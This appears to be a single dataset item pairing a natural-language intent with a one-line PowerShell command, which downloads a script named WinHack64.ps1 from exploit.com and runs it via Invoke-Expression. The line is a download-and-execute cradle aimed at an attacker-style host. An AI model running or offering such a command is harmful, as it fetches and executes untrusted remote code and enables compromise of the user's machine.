# Natural language intent:
# Downloads and executes a PowerShell script from a specified URL.

$url = "http://exploit.com/WinHack64.ps1"; Invoke-Expression (New-Object System.Net.WebClient).DownloadString($url)
